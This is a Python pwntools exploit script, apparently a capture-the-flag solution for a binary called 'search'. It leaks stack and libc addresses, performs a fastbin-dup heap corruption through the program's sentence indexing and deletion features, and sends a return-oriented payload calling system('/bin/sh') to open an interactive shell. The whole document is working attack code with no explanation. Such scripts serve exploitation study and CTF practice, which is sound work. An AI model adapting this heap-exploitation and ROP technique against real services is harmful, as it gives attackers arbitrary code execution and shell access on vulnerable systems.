#!/usr/bin/python
from pwn import *
import code

context(terminal = ['xterm', 'splitw'])
#context.terminal = ['tmux', 'splitw', '-h']
local = True
elf = ELF('./search')

if local:
	p = process('./search')
    #    gdb.attach(p)
else:
	libc = ELF()
	p = remote()

def leakstack():
    p.sendline("a"*48)
    leak = p.recvline().split(' ')[0][48:]
    return u64(leak.ljust(8, '\x00'))

def libcleak():
    p.sendline('2')
    p.sendline('256')
    p.sendline(('a'*200 + ' leak ').ljust(256, 'c'))

    p.sendline('1')
    p.sendline('4')
    p.sendline('leak')
    p.sendline('y')
    p.recv(1024)

    p.sendline('1')
    p.sendline('4')
    p.sendline('\x00' * 4)
    p.recvuntil('256: ')
    libaddr = p.recv(6)
    p.sendline('n')
     
    return u64(libaddr.ljust(8, '\x00'))

def makechain():
    p.sendline('2')
    p.sendline('56')
    p.sendline('a'*53 + ' ab')

    p.sendline('2')
    p.sendline('56')
    p.sendline('b'*53 + ' ab')

    p.sendline('2')
    p.sendline('4')
    p.sendline('aaaa')

    p.sendline('2')
    p.sendline('56')
    p.sendline('c'*53 + ' ab')
    
    p.sendline('1')
    p.sendline('2')
    p.sendline('ab')
    p.sendline('y')
    p.sendline('y')
    p.sendline('y')
    
    p.sendline('1')
    p.sendline('2')
    p.sendline('\x00\x00')
    p.sendline('y')
    p.sendline('n')




system_off = 0x7ffff7a52390 - 0x7ffff7dd1b78
binsh_off = 0x7ffff7b99d57 - 0x07ffff7dd1b78

# stack leak
print p.recv(1024)
staddr = leakstack()
staddr = leakstack()
log.info('staddr =' + hex(staddr))

# libc leak
libadd = libcleak()
log.info('libcaddr =' + hex(libadd))
# fastbin dup
makechain()

p.sendline('2')
p.sendline('56')
p.sendline(p64(staddr+0x48+2-0x8).ljust(56,'a'))

p.sendline('2')
p.sendline('56')
p.sendline('a'*56)

p.sendline('2')
p.sendline('56')
p.sendline('b'*56)
# payload

poprdi_ret=0x400e23
p.sendline('2')
p.sendline('56')
p.sendline(('\x0a'*6+ p64(poprdi_ret) + p64(libadd + binsh_off) + p64(libadd + system_off)).ljust(56, 'a'))
p.interactive()

